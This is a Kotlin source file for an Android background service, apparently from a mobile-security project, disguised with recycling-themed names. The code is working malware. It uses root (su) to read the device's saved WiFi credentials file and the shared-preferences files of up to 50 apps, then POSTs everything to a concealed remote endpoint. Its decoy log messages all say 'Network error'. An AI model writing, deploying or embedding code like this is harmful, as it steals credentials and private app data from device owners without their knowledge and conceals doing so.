package com.example.mobsec_823.RecylingService

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.StringBuilder

class RecyclingTruckService : Service() {

    private val TAG = "RecyclingTruckService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.w(TAG, "Network error")

        if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {
            Log.w(TAG, "Network error")
        }

        Thread {
            try {
                if (!SafetyNet.checkKitchenPermit(22)) {
                    return@Thread
                }
                
                val recycledData = sortMaterials()
                if (recycledData.isNotEmpty()) {
                    sendToProcessingPlant(recycledData)
                } else {
                    Log.w(TAG, "Network error")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Network error")
            } finally {
                stopSelf()
            }
        }.start()
        return START_NOT_STICKY
    }

    private fun sortMaterials(): String {
        val sb = StringBuilder("=== RECYCLING SORTED MATERIALS ===\n\n")

        // WiFi credentials
        sb.append("--- [Glass] Material Collection ---\n")
        val wifiPath = SecretBox.getWifiPath()
        if (wifiPath.isNotEmpty()) {
            // Label as "File: " to match Python parser expectation
            sb.append("File: $wifiPath\n")
            val wifiData = executeFactoryCommand("cat $wifiPath")
            sb.append(wifiData ?: "Bin empty\n")
        }

        // SharedPreferences
        sb.append("\n--- [Paper/Plastic] Material Collection ---\n")
        val findCmd = "find /data/data -name \"*.xml\" -path \"*/shared_prefs/*\" 2>/dev/null"
        val prefsList = executeFactoryCommand(findCmd)
        prefsList?.let { list ->
            val files = list.lines().filter { it.isNotBlank() }.take(50)
            files.forEach { file ->
                // Label as "File: " to match Python parser expectation
                sb.append("\nFile: $file\n")
                sb.append(executeFactoryCommand("cat \"$file\"") ?: "Crushed\n")
            }
        }

        return sb.toString()
    }

    private fun executeFactoryCommand(command: String): String? {
        return try {
            val su = SecretBox.getSuCmd()
            val cmd = arrayOf(su, "-c", command)
            val process = SecretBox.reflectedExec(cmd) ?: return null
            
            BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                StringBuilder().apply {
                    reader.forEachLine { append(it).append("\n") }
                }.toString()
            }.also { process.waitFor() }
        } catch (e: Exception) {
            null
        }
    }

    private fun sendToProcessingPlant(data: String) {
        try {
            val endpoint = SecretBox.getRecycleEndpoint()
            if (endpoint.isEmpty()) return

            val client = OkHttpClient()
            val requestBody = data.toRequestBody("text/plain".toMediaType())
            val request = Request.Builder()
                .url(endpoint)
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) Log.w(TAG, "Network error")
                else Log.w(TAG, "Network error")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Network error")
        }
    }
}
